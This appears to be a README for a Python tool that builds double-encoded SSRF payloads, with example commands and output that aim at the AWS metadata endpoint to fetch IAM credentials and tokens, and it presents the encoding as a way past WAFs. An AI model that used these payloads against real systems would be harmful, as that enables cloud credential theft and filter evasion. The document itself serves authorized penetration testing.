# SSRF URL Encoder
`ssrf-url-encoder` is a Python-based utility designed to construct URL-encoded payloads for SSRF exploitation. It allows users to single encode, recursively decode, and construct complex SSRF payloads with custom proxy endpoints, HTTP methods, and headers.

## Features
- Construct SSRF payloads with custom proxy endpoints.
- Single encode or recursively decode URLs.
- Embed HTTP methods and headers into the payload structure.
- Save encoded payloads to a file for reuse.
- Verbose mode for step-by-step output.

## Usage
```bash
python3 ssrf-url-encoder.py --target <TARGET_URL> --proxy <PROXY_URL> [--method <METHOD_KEY=VALUE>] [--headers <HEADERS_KEY=VALUE>] [--single] [--decode] [--output <OUTPUT_FILE>] [--verbose]
```

## Arguments:
- `--target` (required): Target URL to encode or decode.
- `--proxy`: Proxy endpoint with parameter key, e.g., `?url=` or `?target=`.
- `--method`: Optional method parameter as key=value, e.g., `method=GET`
                     or `method=PUT`.
- `--headers`: Optional headers parameter as key=value, e.g.,
                     `headers=X-aws-ec2-metadata-token-ttl-seconds=21600`.
- `--single`: Single encode the target URL only.
- `--decode`: Recursively decode the target URL.
- `--output`: Save the encoded or decoded payload to a file.
- `--verbose`: Display step-by-step output for debugging.

### How It Works
The `ssrf-url-encoder` script constructs URL-encoded SSRF payloads by systematically encoding the target URL to achieve multiple encoding layers. This process is particularly useful when targeting applications that require double-encoded payloads to bypass filters or proxy constraints.

**Single Encoding Process:** The target URL is first single encoded using standard URL encoding (`%` encoding). This prepares the URL for safe inclusion within a proxy endpoint or as a standalone payload.

**Hybrid Encoding Process (Achieving Double Encoding)**
1. **Initial Single Encoding of Target:** The target URL is single encoded to prepare it for inclusion in the proxy structure.
   - Example:
     - Input: `http://example.com/resource`
     - Single Encoded: `http%3A%2F%2Fexample.com%2Fresource`

2. **Appending to Proxy URL:** The single encoded target is then embedded within the proxy URL as the value of the query parameter defined by the user. This creates the intermediate URL structure.
   - Example:
     - Proxy Structure: `http://proxy.com/?url=`
     - Intermediate URL: `http://proxy.com/?url=http%3A%2F%2Fexample.com%2Fresource`

3. **Second Single Encoding (Achieving Double Encoding):** The entire constructed proxy URL is then single encoded again to achieve the intended double encoding. This ensures that the payload is sufficiently obfuscated to bypass WAFs or other filtering mechanisms.
   - Example:
     - Intermediate URL: `http://proxy.com/?url=http%3A%2F%2Fexample.com%2Fresource`
     - Double Encoded: `http%253A%252F%252Fproxy.com%252F%253Furl%253Dhttp%25253A%25252F%25252Fexample.com%25252Fresource`

**Recursive Decoding:** When the `--decode` flag is used, the script recursively decodes the payload until no further decoding is possible, ensuring that deeply nested encoded payloads are fully resolved.

## Output Examples
**1. Constructing SSRF Payload with Method and Headers**
```bash
python3 ssrf-url-encoder.py --target http://169.254.169.254/latest/meta-data/iam/security-credentials/example-role --proxy 'http://127.0.0.1:10000/example-api-proxy/?url=' --method method=GET --headers 'headers={"X-aws-ec2-metadata-token":"AQAEAIZ2Xm9LEU9CHnA-riXpyF1pKt83STDxhCPCCrw224gEXAMPLE=="}' --verbose --output encoded_payload.txt      
[+] Payload saved to: encoded_payload.txt
[INFO] Target URL encoded once: http%3A%2F%2F169.254.169.254%2Flatest%2Fmeta-data%2Fiam%2Fsecurity-credentials%2Fexample-role
[INFO] Proxy URL constructed: http%3A%2F%2F127.0.0.1%3A10000%2Fexample-api-proxy%2F%3Furl%3Dhttp%253A%252F%252F169.254.169.254%252Flatest%252Fmeta-data%252Fiam%252Fsecurity-credentials%252Fexample-role%26method%3DGET%26headers%3D%7B%22X-aws-ec2-metadata-token%22%3A%22AQAEAIZ2Xm9LEU9CHnA-riXpyF1pKt83STDxhCPCCrw224gEXAMPLE%3D%3D%22%7D
[INFO] Final single encoded payload: http%3A%2F%2F127.0.0.1%3A10000%2Fexample-api-proxy%2F%3Furl%3Dhttp%253A%252F%252F169.254.169.254%252Flatest%252Fmeta-data%252Fiam%252Fsecurity-credentials%252Fexample-role%26method%3DGET%26headers%3D%7B%22X-aws-ec2-metadata-token%22%3A%22AQAEAIZ2Xm9LEU9CHnA-riXpyF1pKt83STDxhCPCCrw224gEXAMPLE%3D%3D%22%7D
```
```
cat encoded_payload.txt 
http%3A%2F%2F127.0.0.1%3A10000%2Fexample-api-proxy%2F%3Furl%3Dhttp%253A%252F%252F169.254.169.254%252Flatest%252Fmeta-data%252Fiam%252Fsecurity-credentials%252Fexample-role%26method%3DGET%26headers%3D%7B%22X-aws-ec2-metadata-token%22%3A%22AQAEAIZ2Xm9LEU9CHnA-riXpyF1pKt83STDxhCPCCrw224gEXAMPLE%3D%3D%22%7D
```

**2. Recursive Decoding of URL**
```bash
python3 ssrf-url-encoder.py --target http%3A%2F%2F127.0.0.1%3A10000%2Fexample-api-proxy%2F%3Furl%3Dhttp%253A%252F%252F169.254.169.254%252Flatest%252Fmeta-data%252Fiam%252Fsecurity-credentials%252Fexample-role%26method%3DGET%26headers%3D%7B%22X-aws-ec2-metadata-token%22%3A%22AQAEAIZ2Xm9LEU9CHnA-riXpyF1pKt83STDxhCPCCrw224gEXAMPLE%3D%3D%22%7D --decode
http://127.0.0.1:10000/example-api-proxy/?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/example-role&method=GET&headers={"X-aws-ec2-metadata-token":"AQAEAIZ2Xm9LEU9CHnA-riXpyF1pKt83STDxhCPCCrw224gEXAMPLE=="}
```

**3. Single Encode a URL**
```bash
--target http://169.254.169.254/latest/api/token --single
http%3A%2F%2F169.254.169.254%2Flatest%2Fapi%2Ftoken
```

## Contributing
If you have an idea for improvement or wish to collaborate, feel free to contribute.

## Disclaimer
Use responsibly. This tool is intended for red teamers, security auditors, and penetration testers with proper authorization.
